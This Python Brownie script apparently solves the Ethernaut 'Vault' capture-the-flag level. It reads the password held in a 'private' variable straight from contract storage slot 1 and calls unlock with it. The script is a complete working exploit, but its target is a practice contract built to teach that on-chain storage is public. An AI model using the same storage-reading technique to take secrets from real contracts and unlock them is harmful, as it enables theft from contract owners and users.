import brownie
from scripts.helpful_scripts import get_account
from brownie import web3, interface
from web3 import Web3

# PLAYER address is "0xF8f8269488f73fab3935555FCDdD6035699deE25"

ETHERNAUT_INSTANCE = "0xE19b93d2dF67E1Ac734645c54d1E75CEB208B6EF"


def main():

    player = get_account()
    print(f"Player = {player}")

    password = web3.eth.get_storage_at(ETHERNAUT_INSTANCE, 1)
    print(f"\nPassword = {password}\n")

    locked = web3.eth.get_storage_at(ETHERNAUT_INSTANCE, 0)
    print(f"Vault is locked = {locked}")

    vault = interface.VaultInterface(ETHERNAUT_INSTANCE)
    vault.unlock(password, {"from": player})

    locked = web3.eth.get_storage_at(ETHERNAUT_INSTANCE, 0)
    print(f"Vault is locked = {locked}")
